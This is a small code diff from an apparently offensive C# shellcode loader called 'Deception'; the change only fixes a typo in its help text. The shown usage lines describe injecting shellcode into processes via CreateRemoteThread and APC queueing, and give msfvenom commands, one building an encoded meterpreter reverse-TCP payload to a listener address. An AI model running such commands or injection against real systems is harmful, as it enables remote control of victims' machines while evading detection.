@@ -71,7 +71,7 @@ namespace Deception
          Console.WriteLine("  ./Deception.exe msf.bin -r       # for remote: CreateRemoteThread via given PID");
          Console.WriteLine("  ./Deception.exe msf.bin -s       # for remote: Spawn notepad.exe and Queue APC inject");
          Console.WriteLine("  ./Deception.exe msf.bin -a       # makes all of the above");         
-         Console.WriteLine("Paylod Examples: ");
+         Console.WriteLine("Payload Examples: ");
          Console.WriteLine("   msfbin: msfvenom -p windows/x64/exec -f raw CMD=calc.exe -o msf.bin");
          Console.WriteLine("   msfbin: msfvenom -p windows/x64/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 LHOST=192.168.159.138 LPORT=8080 -f raw -o msf.bin");
          System.Environment.Exit(0);
